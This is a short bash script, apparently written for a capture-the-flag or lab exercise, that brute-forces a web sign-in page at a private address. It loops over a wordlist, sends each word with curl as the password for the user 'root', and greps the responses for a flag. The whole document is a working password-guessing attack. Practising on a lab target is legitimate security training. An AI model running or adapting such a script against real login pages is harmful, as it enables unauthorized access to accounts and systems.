#/bin/bash
for line in `cat dictionnary`
do
#	echo $line
	curl 'http://10.0.2.8/?page=signin&username=root&password='$line'&Login=Login#' >> trash
	cat trash | grep flag
done
